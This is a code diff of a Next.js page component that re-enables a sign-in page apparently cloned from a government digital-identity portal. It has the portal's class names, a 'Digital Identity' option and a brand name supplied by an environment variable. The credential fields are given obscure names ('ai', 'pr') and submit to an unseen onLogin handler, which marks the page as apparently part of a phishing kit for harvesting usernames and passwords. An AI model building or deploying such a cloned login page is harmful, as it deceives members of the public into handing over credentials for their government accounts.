@@ -66,7 +66,7 @@ export default function Home() {
 
   return (
     <>
-      {/* <header role="banner" className="mgvEnhanceHeader">
+      <header role="banner" className="mgvEnhanceHeader">
         <section className="wrapper">
           <div className="inner">
             <div className="unauth-grid">
@@ -96,25 +96,32 @@ export default function Home() {
                 <div className="login-grid-column">
                   <div className="digital-id-login-card-wrapper">
                     <div className="digital-id-main-login-card override">
-                      <a data-go-back-link="" className="button-back" href="#"
-                      >Back</a
-                      >
+                      <a className="button-back" href="#">
+                        Back
+                      </a>
+
                       <h1>Sign in with {process.env.NEXT_PUBLIC_TITLE}</h1>
+
                       <p className="login-instruction-text">
                         Choose how to sign in from these 2 options
                       </p>
+
                       <h2 className="text-align-left">
                         Using your {process.env.NEXT_PUBLIC_TITLE} sign in details
                       </h2>
+
                       <form id="login" onSubmit={onLogin}>
                         <input type="hidden" name="btn1" value="btn1" />
+
                         <div id="msg" style={{ display: "none", color: "red" }}>
                           Invalid password..! Please enter correct password.
                         </div>
+
                         <div className="input-group">
-                          <label className="override" htmlFor="userId"
-                          >Username or email</label
-                          >
+                          <label className="override" htmlFor="userId">
+                            Username or email
+                          </label>
+
                           <input
                             id="userId"
                             name="ai"
@@ -124,24 +131,27 @@ export default function Home() {
                             onChange={(e) => setUsername(e.target.value)}
                           />
                         </div>
+
                         <p className="recovery">
                           <a href="#" className="anchor override">Forgot username</a>
                         </p>
+
                         <div className="input-group">
                           <label htmlFor="password" className="override">Password</label>
                           <div className="password-group">
                             <button
                               className="showPassword anchor"
                               type="button"
-                              aria-describedby="show-hide-helpmsg"
                               aria-label="Show password as plain text."
                             >
                               Show
                             </button>
+
                             <p className="is-visuallyhidden" id="show-hide-helpmsg">
                               Note: this will visually expose your password on the
                               screen.
                             </p>
+
                             <input
                               id="password"
                               name="pr"
@@ -152,9 +162,11 @@ export default function Home() {
                             />
                           </div>
                         </div>
+
                         <p className="recovery">
                           <a href="#" className="anchor override">Forgot password</a>
                         </p>
+
                         <div className="button-digital-id-main-container override">
                           <div className="digital-id-button-container">
                             <button
@@ -167,16 +179,19 @@ export default function Home() {
                             </button>
                           </div>
                         </div>
+
                         <p className="create-account-text">
-                          <a className="create-account-link" href="#"
-                          >Create a {process.env.NEXT_PUBLIC_TITLE} account</a
-                          >
+                          <a className="create-account-link" href="#">
+                            Create a {process.env.NEXT_PUBLIC_TITLE} account
+                          </a>
                           if you don&apos;t have one already.
                         </p>
                       </form>
+
                       <div className="hr-word">
                         <div className="draw-circle">or</div>
                       </div>
+
                       <div className="digital-id-login-card secondary">
                         <div className="button-digital-id-container">
                           <h2 className="text-align-left">
@@ -189,9 +204,9 @@ export default function Home() {
                                 <a href="#" target="_blank">Digital Identity</a>
                                 and <a href="#" target="_blank">{process.env.NEXT_PUBLIC_TITLE}ID</a>?
                               </p>
-                              <a className="button-digital-identity" href="#"
-                              >Continue with Digital Identity</a
-                              >
+                              <a className="button-digital-identity" href="#">
+                                Continue with Digital Identity
+                              </a>
                               <input
                                 type="hidden"
                                 value="{flowScope.targetParamDI}"
@@ -251,7 +266,7 @@ export default function Home() {
             </div>
           </div>
         </div>
-      </footer> */}
+      </footer>
     </>
   );
 }
